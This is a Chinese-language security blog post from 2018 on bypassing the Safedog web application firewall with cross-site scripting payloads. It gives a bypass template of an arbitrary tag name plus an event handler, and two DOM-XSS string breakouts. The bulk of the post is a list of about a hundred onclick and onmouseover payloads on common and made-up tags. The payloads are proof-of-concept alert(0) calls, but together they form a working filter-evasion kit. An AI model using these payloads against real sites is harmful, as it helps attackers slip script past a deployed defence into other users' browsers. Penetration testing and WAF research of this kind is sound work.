---
title: "XSS 绕过安全狗"
date: 2018-08-15T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['xss','bypass','safedog']
categories: ['web','bypass']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


XSS 绕过安全狗

<!--more-->

## ref-xss

绕过 payload 格式.

```
<[WORD] on[EVENT]=[EVAL]>[TEXT]
```

在随机单词的标签内加上 on 事件, 最后在标签外加上文本.

因为 html 的松散性, 导致 `<sb>sb</sb>` 都能被解析成标签, 并且支持触发类似于 `onclick` `onmouseover` 的事件.

特别小众的标签也可以绕过安全狗的规则, 比如 `acronym` `address`, 翻翻 w3c 的教程能找出好多.

## dom-xss

安全狗不存在 dom-xss 的拦截规则.

基本上没有尖括号就可以绕过了, 或者使用上面的 payload.

由于上下文是在 JavaScript 的环境内, 会有很多的变形.

```
";alert(0);//
";document.write("\u003cscript\u003ealert(0)\u003c\u002fscript\u003e");//
```

总之先闭合 然后直接弹窗 or 用 `docment.write` 写标签.

## payloads

```
<a onclick="javascript:alert(0)">a
<javascript onclick="javascript:alert(0)">a
<b onclick="javascript:alert(0)">a
<abbr onclick="javascript:alert(0)">a
<acronym onclick="javascript:alert(0)">a
<address onclick="javascript:alert(0)">a
<applet onclick="javascript:alert(0)">a
<article onclick="javascript:alert(0)">a
<xss onclick="javascript:alert(0)">a
<aside onclick="javascript:alert(0)">a
<bdi onclick="javascript:alert(0)">a
<bdo onclick="javascript:alert(0)">a
<big onclick="javascript:alert(0)">a
<button onclick="javascript:alert(0)">a
<del onclick="javascript:alert(0)">a
<details onclick="javascript:alert(0)">a
<div onclick="javascript:alert(0)">a
<dfn onclick="javascript:alert(0)">a
<dl onclick="javascript:alert(0)">a
<dt onclick="javascript:alert(0)">a
<h1 onclick="javascript:alert(0)">a
<h2 onclick="javascript:alert(0)">a
<h3 onclick="javascript:alert(0)">a
<h4 onclick="javascript:alert(0)">a
<h5 onclick="javascript:alert(0)">a
<h6 onclick="javascript:alert(0)">a
<header onclick="javascript:alert(0)">a
<hr onclick="javascript:alert(0)">a
<html onclick="javascript:alert(0)">a
<kbd onclick="javascript:alert(0)">a
<map onclick="javascript:alert(0)">a
<mark onclick="javascript:alert(0)">a
<menu onclick="javascript:alert(0)">a
<menuitem onclick="javascript:alert(0)">a
<meter onclick="javascript:alert(0)">a
<q onclick="javascript:alert(0)">a
<var onclick="javascript:alert(0)">a
<xmp onclick="javascript:alert(0)">a
<addons onclick="javascript:alert(0)">a
<ascii onclick="javascript:alert(0)">a
<aspx onclick="javascript:alert(0)">a
<java onclick="javascript:alert(0)">a
<mobile onclick="javascript:alert(0)">a
<go onclick="javascript:alert(0)">a
<alibaba onclick="javascript:alert(0)">a
<baidu onclick="javascript:alert(0)">a
<google onclick="javascript:alert(0)">a
<github onclick="javascript:alert(0)">a
<acu onclick="javascript:alert(0)">a
<mail onclick="javascript:alert(0)">a
<a onmouseover="javascript:alert(0)">a
<javascript onmouseover="javascript:alert(0)">a
<b onmouseover="javascript:alert(0)">a
<abbr onmouseover="javascript:alert(0)">a
<acronym onmouseover="javascript:alert(0)">a
<address onmouseover="javascript:alert(0)">a
<applet onmouseover="javascript:alert(0)">a
<article onmouseover="javascript:alert(0)">a
<xss onmouseover="javascript:alert(0)">a
<aside onmouseover="javascript:alert(0)">a
<bdi onmouseover="javascript:alert(0)">a
<bdo onmouseover="javascript:alert(0)">a
<big onmouseover="javascript:alert(0)">a
<button onmouseover="javascript:alert(0)">a
<del onmouseover="javascript:alert(0)">a
<details onmouseover="javascript:alert(0)">a
<div onmouseover="javascript:alert(0)">a
<dfn onmouseover="javascript:alert(0)">a
<dl onmouseover="javascript:alert(0)">a
<dt onmouseover="javascript:alert(0)">a
<h1 onmouseover="javascript:alert(0)">a
<h2 onmouseover="javascript:alert(0)">a
<h3 onmouseover="javascript:alert(0)">a
<h4 onmouseover="javascript:alert(0)">a
<h5 onmouseover="javascript:alert(0)">a
<h6 onmouseover="javascript:alert(0)">a
<header onmouseover="javascript:alert(0)">a
<hr onmouseover="javascript:alert(0)">a
<html onmouseover="javascript:alert(0)">a
<kbd onmouseover="javascript:alert(0)">a
<map onmouseover="javascript:alert(0)">a
<mark onmouseover="javascript:alert(0)">a
<menu onmouseover="javascript:alert(0)">a
<menuitem onmouseover="javascript:alert(0)">a
<meter onmouseover="javascript:alert(0)">a
<q onmouseover="javascript:alert(0)">a
<var onmouseover="javascript:alert(0)">a
<xmp onmouseover="javascript:alert(0)">a
<addons onmouseover="javascript:alert(0)">a
<ascii onmouseover="javascript:alert(0)">a
<aspx onmouseover="javascript:alert(0)">a
<java onmouseover="javascript:alert(0)">a
<mobile onmouseover="javascript:alert(0)">a
<go onmouseover="javascript:alert(0)">a
<alibaba onmouseover="javascript:alert(0)">a
<baidu onmouseover="javascript:alert(0)">a
<google onmouseover="javascript:alert(0)">a
<github onmouseover="javascript:alert(0)">a
<acu onmouseover="javascript:alert(0)">a
<mail onmouseover="javascript:alert(0)">a
```